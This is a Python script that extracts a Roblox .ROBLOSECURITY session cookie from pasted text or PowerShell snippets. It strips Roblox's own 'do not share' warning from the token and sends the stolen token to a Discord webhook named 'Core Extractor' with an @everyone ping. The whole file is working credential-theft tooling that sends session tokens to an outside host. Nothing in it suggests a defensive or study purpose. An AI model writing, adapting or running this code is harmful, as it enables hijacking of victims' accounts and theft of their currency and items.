import os
import re
import sys
from curl_cffi import requests

def extract_and_clean_cookie(raw_input):
    """Extracts and sanitizes the security token from various payload formats."""
    if not raw_input:
        return ""
    
    raw_str = str(raw_input).strip()

    # Match common patterns in scripts
    patterns = [
        r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']',
        r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, raw_str)
        if match:
            raw_str = match.group(1)
            break

    # Strip quotes and prefixes
    if (raw_str.startswith('"') and raw_str.endswith('"')) or (raw_str.startswith("'") and raw_str.endswith("'")):
        raw_str = raw_str[1:-1].strip()
        
    if raw_str.startswith(".ROBLOSECURITY="):
        raw_str = raw_str[len(".ROBLOSECURITY="):].strip()

    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if raw_str.startswith(warning_text):
        raw_str = raw_str[len(warning_text):].strip()

    cleaned = raw_str.lstrip('.').rstrip(';').strip()
    return cleaned if len(cleaned) > 30 else None

def main():
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_input_data = sys.stdin.read()
    if not raw_input_data:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(raw_input_data)
    if not raw_cookie:
        sys.exit(1)

    payload = {
        "content": "@everyone",
        "username": "Core Extractor",
        "avatar_url": "https://cdn.discordapp.com/emojis/1085024250275815525.png",
        "embeds": [
            {
                "title": "🔑 Secure Session Token",
                "description": f"```text\n{raw_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    try:
        requests.post(webhook_url, json=payload, timeout=5)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
